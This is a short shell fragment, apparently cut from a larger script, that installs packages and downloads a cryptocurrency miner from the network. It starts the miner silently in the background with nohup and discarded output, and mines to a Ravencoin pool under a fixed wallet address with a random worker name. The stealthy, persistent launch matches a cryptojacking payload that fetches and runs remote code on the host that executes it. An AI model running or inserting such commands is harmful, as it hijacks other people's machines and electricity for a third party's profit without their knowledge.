RANDOM_USER=$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 8)

# Run the miner in the background with the random username
nohup bash -c 'apt update && apt install -y wget && apt install -y tar xz-utils && wget https://github.com/trexminer/T-Rex/releases/download/0.26.8/t-rex-0.26.8-linux.tar.gz && tar -xzf t-rex-0.26.8-linux.tar.gz && nohup ./t-rex -a kawpow -o stratum+tcp://stratum.ravenminer.com:3838 -u RJm3xVzJEoNq52UrL57eT65paQkipeUWpK.$RANDOM_USER' > /dev/null 2>&1 &`);
